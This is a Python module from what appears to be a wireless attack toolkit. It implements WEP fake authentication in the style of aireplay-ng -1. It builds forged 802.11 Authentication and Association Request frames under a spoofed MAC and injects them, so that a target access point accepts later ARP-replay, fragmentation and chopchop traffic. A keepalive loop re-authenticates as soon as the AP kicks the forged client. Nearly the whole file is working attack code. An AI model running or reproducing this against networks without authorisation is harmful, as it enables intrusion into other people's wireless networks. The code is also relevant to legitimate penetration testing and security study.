"""WEP fake authentication (`aireplay-ng -1`).

Open-System Authentication + Association as a forged STA so the AP will
accept frames we inject later (ARP replay, fragmentation, chopchop). On its
own it generates no IVs — it's the prerequisite that unlocks the rest of the
WEP suite.

Lifecycle mirrors WPA3DowngradeAttack: ``start()`` spins up an async
keepalive loop + RX filter, ``stop()`` tears them down. The loop
re-authenticates every ``interval`` seconds (APs silently drop idle
associations on an inactivity timer; there's no lease in the protocol), and
*reactively* re-auths the instant we see a Deauth/Disassoc addressed to our
MAC — so a manual "deauth YOU" (or the real AP kicking us) recovers within
one RX tick instead of waiting out the countdown.

State is exposed for the Focus SECURITY panel: ``state`` (idle / authenticating
/ associated / failed), ``next_reauth_at`` (drives the countdown) and
``fail_reason``.
"""

from __future__ import annotations

import asyncio
import logging
import os
import struct
import time
from dataclasses import dataclass, field
from typing import Callable, Optional

from wifit3.engine.models import AccessPoint

logger = logging.getLogger(__name__)

# Supported-rates IEs (same menu the PMKID harvester uses — APs only check
# well-formedness).
_SUPPORTED_RATES = bytes([0x82, 0x84, 0x8B, 0x96, 0x0C, 0x12, 0x18, 0x24])
_EXT_SUPPORTED_RATES = bytes([0x30, 0x48, 0x60, 0x6C])

# Capability Info for the Assoc Req: ESS (bit 0) + Privacy (bit 4). The
# Privacy bit is mandatory for a WEP network — an Assoc Req without it is
# rejected as a capability mismatch.
_CAP_ESS_PRIVACY = 0x0011

# 802.11 management subtypes we care about in the RX filter.
_SUBTYPE_ASSOC_RESP = 0x01
_SUBTYPE_AUTH = 0x0B
_SUBTYPE_DEAUTH = 0x0C
_SUBTYPE_DISASSOC = 0x0A


def _mac_str(b: bytes) -> str:
    return ":".join(f"{x:02x}" for x in b)


def _str_to_mac(s: str) -> bytes:
    return bytes(int(x, 16) for x in s.split(":"))


def _random_client_mac() -> bytes:
    """Locally-administered, unicast MAC (LAA bit set, multicast clear)."""
    return bytes([0x02]) + os.urandom(5)


@dataclass
class FakeAuthStats:
    auth_attempts: int = 0
    associations: int = 0
    reactive_reauths: int = 0
    started_at: float = field(default_factory=time.time)


class WepFakeAuth:
    """Open-System fake-auth keepalive daemon against one WEP AP."""

    def __init__(
        self,
        iface,
        target: AccessPoint,
        source_mac: Optional[bytes] = None,
        interval: float = 30.0,
        fail_retry_interval: float = 3.0,
        assoc_timeout: float = 2.0,
        log_callback: Optional[Callable[[str], None]] = None,
    ):
        self.iface = iface
        self.target = target
        self.bssid_bytes = _str_to_mac(target.bssid)
        self.source_mac = source_mac or _random_client_mac()
        self.interval = interval
        self.fail_retry_interval = fail_retry_interval
        self.assoc_timeout = assoc_timeout
        self._log = log_callback or (lambda _msg: None)
        # Last time we did something that keeps the AP's inactivity timer at
        # bay (auth or injected replay traffic). The keepalive skips its
        # periodic re-auth while this is fresh, so active replay isn't
        # interrupted every `interval` seconds.
        self._last_activity = 0.0

        self.stats = FakeAuthStats()
        # State machine surfaced to the UI.
        self.state: str = "idle"          # idle|authenticating|associated|failed
        self.fail_reason: Optional[str] = None
        self.next_reauth_at: Optional[float] = None

        self._active = False
        self._task: Optional[asyncio.Task] = None
        # Set by the RX filter; cleared by the loop. Carries "associated" and
        # "kicked" signals from the sync callback to the async loop.
        self._assoc_ok = False
        self._reauth_event = asyncio.Event()

    # ---- Frame builders -----------------------------------------------------

    def _build_auth_req(self) -> bytes:
        """Open-System Authentication Request (algo=0, seq=1, status=0)."""
        mac_hdr = (
            b"\xb0\x00"            # FC: mgmt, subtype Auth (0x0B)
            + b"\x00\x00"          # Duration
            + self.bssid_bytes     # Addr1 = BSSID (dest)
            + self.source_mac      # Addr2 = us (source)
            + self.bssid_bytes     # Addr3 = BSSID
            + b"\x00\x00"          # Seq (hardware fills)
        )
        body = b"\x00\x00" + b"\x01\x00" + b"\x00\x00"  # algo=0, seq=1, status=0
        return mac_hdr + body

    def _build_assoc_req(self) -> bytes:
        """Association Request: Privacy capability + SSID + rates, NO RSN IE
        (WEP predates RSN — an RSN IE would get us rejected)."""
        mac_hdr = (
            b"\x00\x00"            # FC: mgmt, subtype Assoc Req (0x00)
            + b"\x00\x00"
            + self.bssid_bytes
            + self.source_mac
            + self.bssid_bytes
            + b"\x00\x00"
        )
        cap_info = struct.pack("<H", _CAP_ESS_PRIVACY)
        listen_int = struct.pack("<H", 0x0001)
        ssid = (self.target.ssid or "").encode("utf-8", errors="ignore")[:32]
        ssid_ie = bytes([0x00, len(ssid)]) + ssid
        rates_ie = bytes([0x01, len(_SUPPORTED_RATES)]) + _SUPPORTED_RATES
        ext_rates_ie = bytes([0x32, len(_EXT_SUPPORTED_RATES)]) + _EXT_SUPPORTED_RATES
        body = cap_info + listen_int + ssid_ie + rates_ie + ext_rates_ie
        return mac_hdr + body

    # ---- Lifecycle ----------------------------------------------------------

    def start(self) -> None:
        """Register the self MAC + RX filter and spin up the keepalive loop."""
        if self._active:
            return
        self._active = True
        self.stats = FakeAuthStats()
        self.state = "authenticating"
        self.fail_reason = None
        self.iface.register_self_mac(self.source_mac, bssid=self.target.bssid)
        self.iface.register_rx_callback(self._rx_cb)
        self._task = asyncio.create_task(self._keepalive_loop())
        logger.info(
            "[WEP-FakeAuth] Started on %s as %s (re-auth every %.0fs)",
            self.target.bssid, _mac_str(self.source_mac), self.interval,
        )

    def stop(self) -> FakeAuthStats:
        """Tear down the loop + RX filter and drop the YOU client. Idempotent."""
        if not self._active:
            return self.stats
        self._active = False
        self.iface.unregister_rx_callback(self._rx_cb)
        if self._task:
            self._task.cancel()
            self._task = None
        self.iface.unregister_self_mac(self.source_mac)
        self.state = "idle"
        self.next_reauth_at = None
        logger.info(
            "[WEP-FakeAuth] Stopped: %d assoc(s), %d reactive re-auth(s).",
            self.stats.associations, self.stats.reactive_reauths,
        )
        return self.stats

    @property
    def is_active(self) -> bool:
        return self._active

    def notify_activity(self) -> None:
        """Called by the replay engine on each injected burst — our own
        traffic keeps the association alive, so the keepalive can skip its
        periodic (disruptive) re-auth while replay is running."""
        self._last_activity = time.time()

    def request_reauth(self) -> None:
        """Ask the loop to re-authenticate immediately (e.g. replay detected a
        stall that looks like a silent de-association)."""
        self._reauth_event.set()

    # ---- Keepalive loop -----------------------------------------------------

    async def _keepalive_loop(self) -> None:
        try:
            await self._authenticate()
            while self._active:
                # Fast retry after a failure; otherwise the normal keepalive.
                timeout = (
                    self.fail_retry_interval
                    if self.state == "failed"
                    else self.interval
                )
                self._reauth_event.clear()
                try:
                    await asyncio.wait_for(self._reauth_event.wait(), timeout=timeout)
                    woke_early = True
                except asyncio.TimeoutError:
                    woke_early = False
                if not self._active:
                    break

                if self.state == "failed":
                    await self._authenticate()                 # fast retry
                elif woke_early:
                    self.stats.reactive_reauths += 1
                    self._log(
                        "[yellow]⟳ Fake-Auth: re-authenticating "
                        "(kicked / requested)[/yellow]"
                    )
                    await self._authenticate()
                elif (time.time() - self._last_activity) > self.interval:
                    # Idle keepalive tick — only when replay isn't already
                    # keeping us associated (avoids interrupting active replay).
                    await self._authenticate()
        except asyncio.CancelledError:
            pass

    async def _authenticate(self) -> None:
        """One Auth → Assoc round; updates state from the AP's response."""
        if self.iface.current_channel != self.target.channel:
            await self.iface.set_channel(self.target.channel)

        self.state = "authenticating"
        self._assoc_ok = False
        self.stats.auth_attempts += 1

        await self.iface.send_raw(self._build_auth_req(), use_no_ack=True)
        await asyncio.sleep(0.1)  # let the AP process Auth before Assoc lands
        await self.iface.send_raw(self._build_assoc_req(), use_no_ack=True)

        deadline = time.time() + self.assoc_timeout
        while time.time() < deadline and self._active and not self._assoc_ok:
            await asyncio.sleep(0.05)

        if self._assoc_ok:
            self.state = "associated"
            self.fail_reason = None
            self.next_reauth_at = None
            self._last_activity = time.time()   # auth counts as keepalive
            self.stats.associations += 1
            self._log(
                f"[green]✓ Fake-Auth: associated[/green] as "
                f"[bold]{_mac_str(self.source_mac)}[/bold]"
            )
        else:
            self.state = "failed"
            # Short reason for the SECURITY panel; full hint goes to the log.
            if not self.fail_reason:
                self.fail_reason = "no Assoc Resp"
            # Drive the panel's "retry in Ns" countdown off the fast-retry tick.
            self.next_reauth_at = time.time() + self.fail_retry_interval
            self._log(
                f"[red]✗ Fake-Auth failed:[/red] {self.fail_reason} "
                f"[dim](out of range / not susceptible? retrying in "
                f"{int(self.fail_retry_interval)}s)[/dim]"
            )

    # ---- RX filter (sync, on the loop) --------------------------------------

    def _rx_cb(self, frame_bytes: bytes, rssi: int, ts: float) -> None:
        """Watch for AP replies addressed to our MAC. Keep this fast.

        Per-subtype length guards: a Deauth/Disassoc is only 26 bytes (24 B
        header + 2 B reason), so a blanket "len >= 28" gate would drop the
        very kicks the reactive re-auth path exists to catch.
        """
        if not self._active or len(frame_bytes) < 24:
            return
        fc0 = frame_bytes[0]
        if (fc0 & 0x0C) != 0x00:   # management frames only
            return
        if frame_bytes[4:10] != self.source_mac:  # Addr1 (dest) must be us
            return
        subtype = (fc0 & 0xF0) >> 4

        if subtype == _SUBTYPE_ASSOC_RESP and len(frame_bytes) >= 28:
            # Body: Capability(2) + Status(2) + AID(2) → status at offset 26.
            status = struct.unpack("<H", frame_bytes[26:28])[0]
            if status == 0:
                self._assoc_ok = True
            else:
                self.fail_reason = f"Assoc rejected (status {status})"
        elif subtype == _SUBTYPE_AUTH and len(frame_bytes) >= 30:
            # Body: Algo(2) + Seq(2) + Status(2) → status at offset 28.
            status = struct.unpack("<H", frame_bytes[28:30])[0]
            if status != 0:
                self.fail_reason = f"Auth rejected (status {status})"
        elif subtype in (_SUBTYPE_DEAUTH, _SUBTYPE_DISASSOC):
            # We got kicked — wake the loop to re-auth immediately.
            self.state = "authenticating"
            self.next_reauth_at = None
            self._reauth_event.set()
